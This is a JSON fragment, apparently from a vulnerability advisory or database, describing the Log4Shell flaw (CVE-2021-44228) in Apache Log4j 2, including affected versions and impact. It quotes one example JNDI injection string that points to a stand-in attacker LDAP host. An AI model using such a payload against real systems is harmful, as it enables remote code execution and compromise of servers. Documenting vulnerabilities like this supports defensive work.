{
    "desc": "CVE\u20112021\u201144228, commonly known as Log4Shell, is a critical remote code execution vulnerability in the Apache Log4j 2 logging library. The library processes message lookups written as `${\u2026}` in logged data. When a JNDI lookup expression such as `${jndi:ldap://attacker.com/a}` is encountered, Log4j initiates a JNDI request to the attacker\u2011controlled LDAP or other JNDI service, retrieves a malicious Java class and loads it into the JVM, where it is executed with the privileges of the vulnerable application. Any Java application that includes Log4j 2 (core versions 2.0\u2011beta9 through 2.15.0, except the security\u2011only releases 2.12.2, 2.12.3, and 2.3.1) and accepts user\u2011controlled input that may be logged (for example HTTP headers, query parameters, cookies, or request bodies) is vulnerable. Successful exploitation gives an attacker full remote code execution on the host, allowing complete compromise of confidentiality, integrity, and availability. The vulnerability was widely exploited in the wild shortly after disclosure, with attackers delivering backdoors, credential stealers, and cryptominers.",
